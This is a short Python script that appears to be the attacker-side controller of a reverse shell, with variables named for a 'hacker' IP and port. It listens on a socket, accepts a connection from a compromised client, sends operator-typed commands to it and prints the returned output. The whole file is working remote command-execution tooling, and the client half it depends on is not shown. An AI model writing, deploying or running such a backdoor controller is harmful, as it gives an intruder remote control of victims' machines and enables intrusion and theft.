import socket
from venv.client_side import IDENTIFIER

hacker_IP = '192.168.43.138'
hacker_PORT = 8008
IDENTIFIER = "<ENS_OF_COMMAND_RESULT>"

hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_address = (hacker_IP,hacker_PORT)
hacker_socket.bind(socket_address)
hacker_socket.listen(5)
hacker_socket, client_address = hacker_socket.accept()

try:
    while True:
        command = input("Enter the command you want to Run: ")
        hacker_socket.send(command.encode())
        if command == "stop":
            hacker_socket.close()
            break
        else:
            full_command_result = b''
            while True:
                chunk = hacker_socket.recv(1024)
                if chunk.endswith(IDENTIFIER.encode()):
                    chunk = chunk[:-len(IDENTIFIER)]
                    full_command_result += chunk
                    break
                full_command_result += chunk
            print(full_command_result.decode())
except Exception:
    print("Exception occured")
